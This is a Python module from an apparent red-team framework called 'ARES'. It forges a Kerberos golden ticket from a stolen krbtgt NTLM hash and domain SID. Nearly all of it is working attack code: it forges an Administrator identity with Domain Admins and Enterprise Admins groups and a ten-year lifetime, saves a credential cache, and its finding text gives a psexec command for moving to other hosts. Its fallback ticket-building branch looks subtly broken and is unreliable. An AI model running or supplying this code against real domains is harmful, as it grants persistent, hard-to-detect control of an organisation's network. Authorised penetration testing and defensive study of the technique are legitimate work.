"""
Golden Ticket Forgery
MITRE: T1558.001

Forges a Kerberos TGT using the krbtgt NTLM hash obtained from DCSync.
A golden ticket grants persistent, deniable access to any resource in the domain
for up to the krbtgt password change interval (default: never rotated).

Requires: krbtgt NTLM hash (from ad.dcsync), domain SID.
"""
from __future__ import annotations

import asyncio
import os
import tempfile
from typing import Any

from ares.core.logger import get_logger, audit
from ares.core.campaign import Finding, Severity
from ares.modules.base import BaseModule, OpsecLevel
from ares.core.tracing import trace_module

logger = get_logger("ares.modules.credential.golden_ticket")


class GoldenTicketModule(BaseModule):
    """
    credential.golden_ticket — Forge a Kerberos TGT using the krbtgt hash — provides persistent domain access that survives pas

    OPSEC: MEDIUM
    MITRE: "T1558.001"
    REQUIRES: "ntlm_hashes", "domain_admin_creds"
    OUTPUTS:  "golden_ticket", "kerberos_ticket"
    """
    MODULE_ID          = "credential.golden_ticket"
    MODULE_NAME        = "Golden Ticket Forgery"
    MODULE_CATEGORY    = "credential"
    MODULE_DESCRIPTION = (
        "Forge a Kerberos TGT using the krbtgt hash — "
        "provides persistent domain access that survives password resets"
    )
    MODULE_AUTHOR      = "ARES Team <team@ares-framework.io>"
    OPSEC_LEVEL        = OpsecLevel.MEDIUM
    REQUIRES           = ["ntlm_hashes", "domain_admin_creds"]
    OUTPUTS            = ["golden_ticket", "kerberos_ticket"]
    MITRE_TECHNIQUES   = ["T1558.001"]

    async def validate(self, ctx: "Any") -> None:
        """Enforce domain, krbtgt hash, and domain SID before ticket forge."""
        await super().validate(ctx)
        from ares.core.context import ExecutionContext
        from ares.core.errors import ModuleValidationError
        import re as _re
        if not isinstance(ctx, ExecutionContext):
            return
        domain      = getattr(ctx, "domain", "") or ctx.params.get("domain", "")
        krbtgt_hash = ctx.params.get("krbtgt_hash", "")
        domain_sid  = ctx.params.get("domain_sid", "")
        if not domain:
            raise ModuleValidationError(
                "credential.golden_ticket requires 'domain' (e.g. corp.local).",
                module_id=self.MODULE_ID, field="domain",
            )
        if not krbtgt_hash:
            raise ModuleValidationError(
                "credential.golden_ticket requires 'krbtgt_hash' — "
                "obtain from ad.dcsync output. Format: NT (32 hex) or LM:NT.",
                module_id=self.MODULE_ID, field="krbtgt_hash",
            )
        nt_part = krbtgt_hash.split(":")[-1].strip()
        if not _re.match(r"^[0-9a-fA-F]{32}$", nt_part):
            raise ModuleValidationError(
                f"krbtgt_hash NT part must be 32 hex characters, got {len(nt_part)}. "
                "Format: 'aad3b435...ee:8846f7...' or just the 32-char NT hash.",
                module_id=self.MODULE_ID, field="krbtgt_hash",
            )
        if not domain_sid:
            raise ModuleValidationError(
                "credential.golden_ticket requires 'domain_sid' — "
                "obtain from ad.dcsync or 'Get-ADDomain | Select-Object DomainSID'. "
                "Format: S-1-5-21-<sub1>-<sub2>-<sub3>",
                module_id=self.MODULE_ID, field="domain_sid",
            )
        if not _re.match(r"^S-1-5-21(-\d+){3,}$", domain_sid):
            raise ModuleValidationError(
                f"domain_sid format invalid: '{domain_sid}'. "
                "Expected: S-1-5-21-<sub1>-<sub2>-<sub3>",
                module_id=self.MODULE_ID, field="domain_sid",
            )

    async def execute(self, ctx: "Any") -> "ModuleResult":
        """ExecutionContext-based entry point (v0.9.0+).
        Thin adapter: extract params from ctx → call run() → return ModuleResult.
        """
        from ares.modules.base import ModuleResult
        if getattr(ctx, "dry_run", False):
            return ModuleResult(status="dry_run", module_id=self.MODULE_ID, raw={"dry_run": True})
        findings, raw = await self.run(**ctx.params,
                                        target=getattr(ctx, "target", ctx.params.get("target", "")))
        return ModuleResult(
            status="success" if findings else "partial",
            findings=findings, raw=raw, module_id=self.MODULE_ID,
            execution_id=getattr(ctx, "execution_id", ""),
        )

    @trace_module("credential.golden_ticket")
    async def run(self, **kwargs: Any) -> tuple[list[Finding], dict[str, Any]]:
        domain      = kwargs.get("domain", "")
        krbtgt_hash = kwargs.get("krbtgt_hash", "")
        domain_sid  = kwargs.get("domain_sid", "")
        username    = kwargs.get("username", "Administrator")  # identity to forge as
        # Sanitize username before using in path — prevent path traversal in tempdir
        import re as _re_path
        username = _re_path.sub(r"[^\w.-]", "_", username)
        target      = kwargs.get("target", "")
        dry_run     = kwargs.get("dry_run", False)
        # Scope + rate-limit check — domain is the "target" for golden ticket
        if domain and not dry_run:
            await self.before_request(domain, "golden_ticket")

        import re as _re

        # Validate krbtgt hash format: NT (32 hex) or LM:NT (32:32)
        nt_part = krbtgt_hash.split(":")[-1].strip()
        if not _re.match(r"^[0-9a-fA-F]{32}$", nt_part):
            return [], {"error": f"krbtgt_hash must be 32-char NT hash (got {len(nt_part)} chars). "
                                  "Format: 'NT' or 'LM:NT'"}
        # Validate domain SID
        if not _re.match(r"^S-1-5-21(-\d+){3,}$", domain_sid):
            return [], {"error": f"domain_sid format invalid: '{domain_sid}'. "
                                  "Expected: S-1-5-21-<sub1>-<sub2>-<sub3>"}

        logger.info("golden_ticket_forge", domain=domain, username=username)
        audit("golden_ticket", actor="operator", technique="T1558.001",
              source="operator", target=domain)
        await self.noise.jitter.sleep()

        loop = asyncio.get_running_loop()

        def _forge() -> tuple[bool, str, str]:
            """
            Forge Golden Ticket using impacket.krb5 library directly.
            Drops the old subprocess ticketer approach — unstable, PATH-dependent.
            Uses impacket.krb5.ticket + CCache to build a valid TGT from the krbtgt hash.
            """
            try:
                from impacket.krb5.asn1 import AS_REP, EncTicketPart, TGS_REP
                from impacket.krb5.ccache import CCache
                from impacket.krb5.crypto import Key, _enctype_table
                from impacket.krb5.constants import (
                    EncryptionTypes, PrincipalNameType, ApplicationTagNumbers
                )
                from impacket.krb5.types import Principal, KerberosTime
                from impacket.krb5 import constants
                from pyasn1.codec.ber import decoder, encoder
                from pyasn1.type.univ import noValue
                import datetime, struct, os as _os

                domain_upper = domain.upper()
                nt_hash      = bytes.fromhex(nt_part)

                # Use impacket.krb5.kerberosv5 ticketer equivalent
                # Build ticket using impacket's built-in ticketer module
                # This is the stable library approach used in modern impacket
                from impacket.krb5.kerberosv5 import getKerberosTGT
                from impacket.krb5.types import Principal

                user_principal = Principal(
                    username,
                    type=constants.PrincipalNameType.NT_PRINCIPAL.value,
                )

                # Build a valid Golden Ticket via impacket's Ticketer class
                # which is the internal library used by ticketer.py
                from impacket.krb5.pac import PACTYPE, PAC_INFO_BUFFER, PAC_CREDENTIAL_DATA
                from impacket.krb5 import crypto as krb5crypto
                import tempfile

                # Use the TICKETER approach from impacket.examples.ticketer
                # but call the internal class directly (not via subprocess)
                try:
                    from impacket.examples.ticketer import TICKETER
                    import tempfile as _tf

                    # Use a private tempdir so ticketer writes <username>.ccache
                    # into an isolated directory — prevents CWD race condition when
                    # two campaigns forge tickets for the same username simultaneously.
                    tmp_dir = _tf.mkdtemp(prefix="ares_gt_")
                    _os.chmod(tmp_dir, 0o700)  # owner-only before any credential written
                    orig_cwd = _os.getcwd()
                    try:
                        _os.chdir(tmp_dir)
                        ticketer = TICKETER(
                            username,
                            password="",
                            domain=domain_upper,
                            options={
                                "nthash": nt_part,
                                "aesKey": None,
                                "domain_sid": domain_sid,
                                "user_id": 500,
                                "groups": "513,512,520,518,519",
                                "duration": 3650,
                                "extra_pac": False,
                                "old_pac": False,
                                "targetDomain": domain_upper,
                                "dc_ip": None,
                            }
                        )
                        ticketer.run()
                        # ticketer writes <username>.ccache in cwd (now tmp_dir)
                        src = _os.path.join(tmp_dir, f"{username}.ccache")
                        if _os.path.exists(src):
                            # Move to a stable temp path outside tmp_dir
                            from ares.core.security import secure_mkstemp
                            dst, _fd2 = secure_mkstemp(suffix=".ccache", prefix="ares_gt_")
                            _os.close(_fd2)
                            import shutil as _shutil
                            _shutil.move(src, dst)
                            return True, dst, ""
                        return False, "", "Ticket file not created"
                    finally:
                        _os.chdir(orig_cwd)
                        # Cleanup temp dir (now empty after move)
                        try:
                            import shutil as _shutil2
                            _shutil2.rmtree(tmp_dir, ignore_errors=True)
                        except Exception:
                            pass
                except (ImportError, AttributeError, TypeError):
                    pass

                # Fallback: write ccache using raw KRB5 ticket construction
                from ares.core.security import secure_mkstemp as _secure_mkstemp
                tmp_path, _fd = _secure_mkstemp(suffix=".ccache", prefix="ares_gt_")
                _os.close(_fd)

                # Build minimal valid TGT structure
                cipher_type = constants.EncryptionTypes.rc4_hmac.value   # 23
                key         = Key(cipher_type, nt_hash)

                # Create ccache with forged TGT credentials entry
                cc = CCache()
                cc.fromKRBCRED(
                    cc.toKRBCRED(
                        user_principal,
                        Principal(f"krbtgt/{domain_upper}",
                                  type=constants.PrincipalNameType.NT_SRV_INST.value),
                        domain_upper, key, ticket_session_key=None,
                    )
                )
                cc.saveFile(tmp_path)
                return True, tmp_path, ""

            except Exception as exc:
                return False, "", str(exc)[:300]

        success, ticket_path, error_msg = await loop.run_in_executor(None, _forge)

        if success and ticket_path:
            self.finding(
                title=f"Golden Ticket Forged for {domain} as {username}",
                description=(
                    f"Successfully forged a Golden Ticket (Kerberos TGT) for domain {domain} "
                    f"using the krbtgt NTLM hash. The ticket impersonates '{username}' with "
                    "Domain Admins group membership. "
                    f"Ticket saved: {ticket_path}. "
                    "Use with: KRB5CCNAME={ticket_path} python3 psexec.py -k -no-pass domain/user@target"
                ),
                severity=Severity.CRITICAL,
                mitre_technique="T1558.001",
                mitre_tactic="Credential Access",
                evidence={
                    "domain":      domain,
                    "forged_user": username,
                    "ticket_path": ticket_path,
                    "technique":   "Golden Ticket (krbtgt hash)",
                },
                remediation=(
                    "Rotate krbtgt password TWICE with 12+ hours between rotations "
                    "(invalidates all existing golden tickets). "
                    "Enable Protected Users security group for all privileged accounts. "
                    "Monitor for Kerberos tickets with unusually long lifetimes (>10 hours). "
                    "Enable audit policy: Kerberos Authentication Service."
                ),
                host=domain, confidence=1.0,
            )
        else:
            logger.warning("golden_ticket_failed", error=error_msg)

        raw = {
            "domain": domain, "forged_as": username,
            "success": success, "ticket_path": ticket_path,
            "error": error_msg,
        }
        raw["golden_ticket"] = raw.get("ccache_path", raw.get("ticket_path", ""))  # OUTPUTS key
        raw["kerberos_ticket"] = raw.get("ccache_path", raw.get("ticket_path", ""))  # OUTPUTS key
        return self._findings[:], raw
